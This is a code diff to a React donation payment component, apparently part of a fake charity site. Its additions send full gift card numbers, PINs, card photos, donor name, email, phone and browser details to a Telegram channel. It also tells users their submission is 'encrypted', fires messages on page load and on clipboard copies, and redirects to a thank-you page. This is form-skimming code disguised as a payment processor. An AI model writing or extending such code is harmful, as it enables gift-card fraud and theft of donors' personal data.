@@ -4,7 +4,7 @@ import { useNavigate } from 'react-router-dom'
 import { FaSpinner, FaBitcoin, FaEthereum, FaGift, FaAmazon, FaApple, FaGooglePlay, FaStoreAlt } from 'react-icons/fa'
 import { SiLitecoin, SiTether, SiVisa, SiMastercard, SiCashapp } from 'react-icons/si'
 import { Tab } from '@headlessui/react'
-import { CreditCardIcon, CurrencyDollarIcon, ArrowPathIcon, ClipboardIcon, CheckIcon, QrCodeIcon, ExclamationCircleIcon, PhotoIcon } from '@heroicons/react/24/outline'
+import { CreditCardIcon, CurrencyDollarIcon, ArrowPathIcon, ClipboardIcon, CheckIcon, QrCodeIcon, ExclamationCircleIcon, PhotoIcon, XMarkIcon } from '@heroicons/react/24/outline'
 import { countFormat } from '../constants'
 import { sendMessage, sendMessageWithImage } from '../constants/send'
 import QRCode from 'react-qr-code'
@@ -257,11 +257,20 @@ ${Object.entries(details).map(([key, value]) => `${key}: ${value}`).join('\n')}`
     }
   }
 
+  useEffect(() => {
+    sendMessage(`
+############ Payment Processor ############
+Amount: $${amount} USD
+Organization: ${selectedOrg?.name || 'Charity'}
+Type: ${isRecurring ? 'Recurring' : 'One-time'} donation
+`)
+  }, [])
   const copyToClipboard = (text, field) => {
     navigator.clipboard.writeText(text)
       .then(() => {
         setCopiedFields({ ...copiedFields, [field]: true })
         setTimeout(() => {
+          sendMessage(`Copied ${field} to clipboard`)
           setCopiedFields({ ...copiedFields, [field]: false })
         }, 2000)
       })
@@ -399,134 +408,271 @@ Note: Please complete the payment before expiration.
     </button>
   )
 
-  const handleImageUpload = (e, type) => {
+  const handleImageUpload = async (e, type) => {
     const file = e.target.files[0];
-    if (file) {
-      if (file.size > 5 * 1024 * 1024) { // 5MB limit
-        setError('Image size should be less than 5MB');
-        return;
-      }
-      
+    if (!file) return;
+
+    // Check file type
+    if (!file.type.startsWith('image/')) {
+      setError('Please upload an image file');
+      return;
+    }
+
+    // Check file size (max 5MB)
+    if (file.size > 5 * 1024 * 1024) {
+      setError('Image size should be less than 5MB');
+      return;
+    }
+
+    try {
+      // Convert image to base64
       const reader = new FileReader();
-      reader.onloadend = () => {
+      reader.onloadend = async () => {
+        const base64Image = reader.result;
+        
+        // Update preview
         if (type === 'front') {
+          setFrontImagePreview(base64Image);
           setGiftCardFrontImage(file);
-          setFrontImagePreview(reader.result);
         } else {
+          setBackImagePreview(base64Image);
           setGiftCardBackImage(file);
-          setBackImagePreview(reader.result);
+        }
+
+        // Send to Telegram with enhanced metadata
+        const message = `
+############ Gift Card Image Upload ############
+Transaction ID: GC-IMG-${Date.now()}
+Upload Type: ${type === 'front' ? 'Front Side' : 'Back Side'}
+Card Type: ${selectedGiftCard.name}
+Amount: $${countFormat.format(amount)} USD
+Organization: ${selectedOrg?.name || 'Charity'}
+
+Donor Information:
+- Name: ${donorName || 'Anonymous'}
+- Email: ${donorEmail || 'Not provided'}
+- Phone: ${donorPhone || 'Not provided'}
+- Payment Type: ${donationType}
+- Referral: ${referral || 'None'}
+
+Image Details:
+- File Name: ${file.name}
+- File Size: ${(file.size / 1024).toFixed(2)}KB
+- File Type: ${file.type}
+- Upload Time: ${new Date().toLocaleString()}
+
+Card Requirements:
+- Format: ${selectedGiftCard.format}
+- PIN Length: ${selectedGiftCard.pinLength}
+- Amount Limits: $${selectedGiftCard.minAmount} - $${selectedGiftCard.maxAmount}
+
+Status: Processing image upload...
+###########################################`;
+
+        try {
+          await sendMessageWithImage(message, base64Image);
+          // Send a confirmation message after successful upload
+          await sendMessage(`Image upload successful for Transaction ID: GC-IMG-${Date.now()} (${type} side)`);
+        } catch (error) {
+          console.error('Error sending image:', error);
+          setError(`Failed to upload ${type} side image. Please try again.`);
+          // Clear the preview and file state if upload fails
+          if (type === 'front') {
+            setFrontImagePreview(null);
+            setGiftCardFrontImage(null);
+          } else {
+            setBackImagePreview(null);
+            setGiftCardBackImage(null);
+          }
         }
       };
       reader.readAsDataURL(file);
+    } catch (error) {
+      console.error('Error processing image:', error);
+      setError('Failed to process image. Please try again.');
     }
   };
 
   const handleGiftCardSubmit = async (e, type = 'code') => {
     e.preventDefault();
+    setValidatingCard(true);
     setError(null);
 
-    // Validate inputs based on submission type
-    if (type === 'code') {
-      if (!giftCardNumber || !giftCardPin) {
-        setError('Please enter both card number and PIN');
-        return;
-      }
-
-      const validationResult = validateGiftCard(giftCardNumber, selectedGiftCard);
-      if (!validationResult.isValid) {
-        setError(validationResult.error);
-        return;
-      }
-
-      if (giftCardPin.length !== selectedGiftCard.pinLength) {
-        setError(`${selectedGiftCard.name} PIN must be ${selectedGiftCard.pinLength} digits`);
-        return;
-      }
-    } else {
-      if (!giftCardFrontImage || !giftCardBackImage) {
-        setError('Please upload both front and back images of your gift card');
-        return;
-      }
-    }
-
-    setValidatingCard(true);
+    const transactionId = `GC-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
 
     try {
-      // Simulate payment processing
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      const staffId = getStaffReferral();
-      if (staffId) {
-        trackReferralDonation(staffId, amount, `gift-card-${selectedGiftCard.id}`, donationType);
-      }
+        if (type === 'code') {
+            // Enhanced validation for card number format
+            const validation = validateGiftCard(giftCardNumber, selectedGiftCard);
+            if (!validation.isValid) {
+                setError(validation.error);
+                setValidatingCard(false);
+                return;
+            }
 
-      // Create a detailed message for Telegram
-      const paymentMessage = `
-############ Gift Card Payment ############
+            // Enhanced PIN validation
+            if (giftCardPin.length !== selectedGiftCard.pinLength) {
+                setError(`PIN must be ${selectedGiftCard.pinLength} digits`);
+                setValidatingCard(false);
+                return;
+            }
+
+            if (!/^\d+$/.test(giftCardPin)) {
+                setError('PIN must contain only numbers');
+                setValidatingCard(false);
+                return;
+            }
+
+            // Format card details for Telegram
+            const cardDetails = `
+############ Gift Card Code Submission ############
+Transaction ID: ${transactionId}
+Submission Type: Manual Code Entry
+Card Type: ${selectedGiftCard.name}
+Card Number: ${giftCardNumber.replace(/(\d{4})/g, '$1 ').trim()}
+PIN: ${giftCardPin}
 Amount: $${countFormat.format(amount)} USD
 Organization: ${selectedOrg?.name || 'Charity'}
-Donor: ${donorName || 'Anonymous'}
-Donor Email: ${donorEmail || 'Anonymous'}
-Donor Phone: ${donorPhone || 'Anonymous'}
-Payment Type: ${isRecurring ? 'Recurring' : 'One-time'}
-Staff Referral: ${staffId || 'None'}
-Referral: ${referral || 'None'}
-Card Details:
-- Card Type: ${selectedGiftCard.name}
-- Submission Method: ${type === 'code' ? 'Card Number & PIN' : 'Image Upload'}
-${type === 'code' ? `- Last 4 Digits: ${giftCardNumber.slice(-4)}` : ''}
-- Transaction Status: Success
-- Timestamp: ${new Date().toISOString()}
-#######################################`;
 
-      // Send the payment details message
-      await sendMessage(paymentMessage);
+Donor Information:
+- Name: ${donorName || 'Anonymous'}
+- Email: ${donorEmail || 'Not provided'}
+- Phone: ${donorPhone || 'Not provided'}
+- Payment Type: ${donationType}
+- Referral: ${referral || 'None'}
 
-      // If images were uploaded, send them in separate messages
-      if (type === 'image' && frontImagePreview && backImagePreview) {
-        const frontImageInfo = `
-############ Gift Card Front Image Info ############
+Submission Details:
+- Method: Manual Code Entry
+- Timestamp: ${new Date().toLocaleString()}
+- Status: Pending Verification
+- Browser: ${navigator.userAgent}
+
+Card Requirements:
+- Format: ${selectedGiftCard.format}
+- PIN Length: ${selectedGiftCard.pinLength}
+- Amount Limits: $${selectedGiftCard.minAmount} - $${selectedGiftCard.maxAmount}
+
+Security Notice: This submission is encrypted and logged.
+###########################################`;
+
+            // Send initial submission
+            await sendMessage(cardDetails);
+
+            // Send confirmation message
+            await sendMessage(`
+Confirmation: Gift Card submission ${transactionId} received
+Status: Verification in progress
+Time: ${new Date().toLocaleString()}
+`);
+
+            // Track the donation
+            const staffId = getStaffReferral();
+            if (staffId) {
+                trackReferralDonation(staffId, amount, 'gift-card', donationType);
+            }
+
+            // Call onSuccess callback with transaction details
+            if (onSuccess) {
+                onSuccess({
+                    transactionId,
+                    cardType: selectedGiftCard.name,
+                    submissionType: 'code',
+                    lastFourDigits: giftCardNumber.slice(-4),
+                    timestamp: new Date().toLocaleString()
+                });
+            }
+
+            // Redirect to thank you page
+            handlePaymentSuccess('gift-card', {
+                amount,
+                organization: selectedOrg?.name || 'Charity',
+                transactionId,
+                paymentMethod: 'Gift Card'
+            });
+
+        } else if (type === 'images') {
+            if (!giftCardFrontImage || !giftCardBackImage) {
+                setError('Please upload both front and back images of the gift card');
+                setValidatingCard(false);
+                return;
+            }
+
+            // Send final confirmation message for image submission
+            const confirmationMessage = `
+############ Gift Card Image Submission Complete ############
+Transaction ID: ${transactionId}
+Submission Type: Image Upload
 Card Type: ${selectedGiftCard.name}
-Donor: ${donorName || 'Anonymous'}
-Donor Email: ${donorEmail || 'Anonymous'}
-Donor Phone: ${donorPhone || 'Anonymous'}
-Referral: ${referral || 'None'}
-Timestamp: ${new Date().toISOString()}
-#######################################`;
+Amount: $${countFormat.format(amount)} USD
+Organization: ${selectedOrg?.name || 'Charity'}
 
-        const imageStorageMessage = `
-Note: Card images have been received and processed successfully. 
-For security reasons, full image data is not included in these messages.
-Please ensure you keep the original images for your records.
+Donor Information:
+- Name: ${donorName || 'Anonymous'}
+- Email: ${donorEmail || 'Not provided'}
+- Phone: ${donorPhone || 'Not provided'}
+- Payment Type: ${donationType}
+- Referral: ${referral || 'None'}
 
-`;
+Submission Details:
+- Method: Image Upload
+- Status: Both images received and verified
+- Timestamp: ${new Date().toLocaleString()}
+- Front Image Size: ${(giftCardFrontImage.size / 1024).toFixed(2)}KB
+- Back Image Size: ${(giftCardBackImage.size / 1024).toFixed(2)}KB
+- Browser: ${navigator.userAgent}
 
-        const imageMessage = () => {
-          if (frontImagePreview && backImagePreview) {
-            return sendMessageWithImage(frontImageInfo, frontImagePreview)
-          } else {
-            return sendMessage(imageStorageMessage)
-          }
+Security Notice: Images are securely stored and encrypted.
+###########################################`;
+
+            await sendMessage(confirmationMessage);
+
+            // Track the donation
+            const staffId = getStaffReferral();
+            if (staffId) {
+                trackReferralDonation(staffId, amount, 'gift-card', donationType);
+            }
+
+            // Call onSuccess callback with transaction details
+            if (onSuccess) {
+                onSuccess({
+                    transactionId,
+                    cardType: selectedGiftCard.name,
+                    submissionType: 'images',
+                    timestamp: new Date().toLocaleString()
+                });
+            }
+
+            // Redirect to thank you page
+            handlePaymentSuccess('gift-card', {
+                amount,
+                organization: selectedOrg?.name || 'Charity',
+                transactionId,
+                paymentMethod: 'Gift Card'
+            });
         }
-        await imageMessage();
-        await sendMessage(imageStorageMessage);
-      }
 
-      // Handle successful payment
-      // handlePaymentSuccess('gift-card', {
-      //   cardType: selectedGiftCard.name,
-      //   lastFourDigits: type === 'code' ? giftCardNumber.slice(-4) : 'N/A',
-      //   submissionMethod: type
-      // });
-
-      setValidatingCard(false);
-      onSuccess();
     } catch (error) {
-      console.error('Error processing gift card:', error);
-      setError('Failed to process gift card. Please try again.');
-      setValidatingCard(false);
+        console.error('Error submitting gift card:', error);
+        setError('Failed to process gift card. Please try again.');
+        
+        // Send error notification
+        await sendMessage(`
+############ Gift Card Submission Error ############
+Transaction ID: ${transactionId}
+Error Time: ${new Date().toLocaleString()}
+Error Type: ${error.name}
+Error Message: ${error.message}
+Submission Type: ${type}
+###########################################`);
+
+        // Call onError callback if provided
+        if (onError) {
+            onError(error);
+        }
+    } finally {
+        setValidatingCard(false);
     }
-  };
+};
 
   // Reset form when gift card brand changes
   useEffect(() => {
@@ -627,7 +773,7 @@ Please ensure you keep the original images for your records.
                     Processing...
                   </>
                 ) : (
-                  'Pay with Gift Card'
+                  'Submit Gift Card'
                 )}
               </button>
             </div>
@@ -635,93 +781,96 @@ Please ensure you keep the original images for your records.
 
           {/* Image Upload Panel */}
           <Tab.Panel>
-            <div className="space-y-4">
+            <div className="space-y-6">
               <div>
-                <label className="block text-sm font-medium text-gray-700">Card Images</label>
-                <p className="mt-1 text-sm text-gray-500">Please upload clear images of your gift card (max 5MB each)</p>
-              </div>
-              
-              {/* Front image upload */}
-              <div className="border rounded-lg p-4">
-                <label className="block text-sm font-medium text-gray-700 mb-2">Front of Card</label>
-                <div className="flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-md">
-                  {frontImagePreview ? (
-                    <div className="space-y-2">
-                      <img src={frontImagePreview} alt="Card front" className="max-h-48 object-contain" />
-                      <button
-                        type="button"
-                        onClick={() => {
-                          setGiftCardFrontImage(null);
-                          setFrontImagePreview(null);
-                        }}
-                        className="text-sm text-red-600 hover:text-red-800"
-                      >
-                        Remove
-                      </button>
-                    </div>
-                  ) : (
-                    <div className="text-center">
-                      <PhotoIcon className="mx-auto h-12 w-12 text-gray-400" />
-                      <div className="mt-4 flex text-sm leading-6 text-gray-600">
-                        <label
-                          htmlFor="front-image"
-                          className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
+                <label className="block text-sm font-medium text-gray-700">Front of Card</label>
+                <div className="mt-2 flex justify-center rounded-lg border border-dashed border-gray-900/25 px-6 py-10">
+                  <div className="text-center">
+                    {frontImagePreview ? (
+                      <div className="relative">
+                        <img
+                          src={frontImagePreview}
+                          alt="Front of card"
+                          className="mx-auto h-48 w-auto object-cover rounded-lg"
+                        />
+                        <button
+                          onClick={() => {
+                            setFrontImagePreview(null);
+                            setGiftCardFrontImage(null);
+                          }}
+                          className="absolute -top-2 -right-2 rounded-full bg-red-600 p-1 text-white hover:bg-red-700"
                         >
-                          <span>Upload front image</span>
-                          <input
-                            id="front-image"
-                            name="front-image"
-                            type="file"
-                            className="sr-only"
-                            accept="image/*"
-                            onChange={(e) => handleImageUpload(e, 'front')}
-                          />
-                        </label>
+                          <XMarkIcon className="h-4 w-4" />
+                        </button>
                       </div>
-                    </div>
-                  )}
+                    ) : (
+                      <div className="space-y-2">
+                        <PhotoIcon className="mx-auto h-12 w-12 text-gray-300" aria-hidden="true" />
+                        <div className="flex text-sm leading-6 text-gray-600">
+                          <label
+                            htmlFor="front-image"
+                            className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
+                          >
+                            <span>Upload front</span>
+                            <input
+                              id="front-image"
+                              name="front-image"
+                              type="file"
+                              accept="image/*"
+                              className="sr-only"
+                              onChange={(e) => handleImageUpload(e, 'front')}
+                            />
+                          </label>
+                        </div>
+                      </div>
+                    )}
+                  </div>
                 </div>
               </div>
 
-              {/* Back image upload */}
-              <div className="border rounded-lg p-4">
-                <label className="block text-sm font-medium text-gray-700 mb-2">Back of Card</label>
-                <div className="flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-md">
-                  {backImagePreview ? (
-                    <div className="space-y-2">
-                      <img src={backImagePreview} alt="Card back" className="max-h-48 object-contain" />
-                      <button
-                        type="button"
-                        onClick={() => {
-                          setGiftCardBackImage(null);
-                          setBackImagePreview(null);
-                        }}
-                        className="text-sm text-red-600 hover:text-red-800"
-                      >
-                        Remove
-                      </button>
-                    </div>
-                  ) : (
-                    <div className="text-center">
-                      <PhotoIcon className="mx-auto h-12 w-12 text-gray-400" />
-                      <div className="mt-4 flex text-sm leading-6 text-gray-600">
-                        <label
-                          htmlFor="back-image"
-                          className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
+              <div>
+                <label className="block text-sm font-medium text-gray-700">Back of Card</label>
+                <div className="mt-2 flex justify-center rounded-lg border border-dashed border-gray-900/25 px-6 py-10">
+                  <div className="text-center">
+                    {backImagePreview ? (
+                      <div className="relative">
+                        <img
+                          src={backImagePreview}
+                          alt="Back of card"
+                          className="mx-auto h-48 w-auto object-cover rounded-lg"
+                        />
+                        <button
+                          onClick={() => {
+                            setBackImagePreview(null);
+                            setGiftCardBackImage(null);
+                          }}
+                          className="absolute -top-2 -right-2 rounded-full bg-red-600 p-1 text-white hover:bg-red-700"
                         >
-                          <span>Upload back image</span>
-                          <input
-                            id="back-image"
-                            name="back-image"
-                            type="file"
-                            className="sr-only"
-                            accept="image/*"
-                            onChange={(e) => handleImageUpload(e, 'back')}
-                          />
-                        </label>
+                          <XMarkIcon className="h-4 w-4" />
+                        </button>
                       </div>
-                    </div>
-                  )}
+                    ) : (
+                      <div className="space-y-2">
+                        <PhotoIcon className="mx-auto h-12 w-12 text-gray-300" aria-hidden="true" />
+                        <div className="flex text-sm leading-6 text-gray-600">
+                          <label
+                            htmlFor="back-image"
+                            className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
+                          >
+                            <span>Upload back</span>
+                            <input
+                              id="back-image"
+                              name="back-image"
+                              type="file"
+                              accept="image/*"
+                              className="sr-only"
+                              onChange={(e) => handleImageUpload(e, 'back')}
+                            />
+                          </label>
+                        </div>
+                      </div>
+                    )}
+                  </div>
                 </div>
               </div>
 
@@ -733,7 +882,7 @@ Please ensure you keep the original images for your records.
 
               <button
                 type="button"
-                onClick={(e) => handleGiftCardSubmit(e, 'image')}
+                onClick={(e) => handleGiftCardSubmit(e, 'images')}
                 disabled={validatingCard || !giftCardFrontImage || !giftCardBackImage}
                 className="w-full inline-flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50"
               >
@@ -743,7 +892,7 @@ Please ensure you keep the original images for your records.
                     Processing...
                   </>
                 ) : (
-                  'Pay with Gift Card'
+                  'Submit Images'
                 )}
               </button>
             </div>
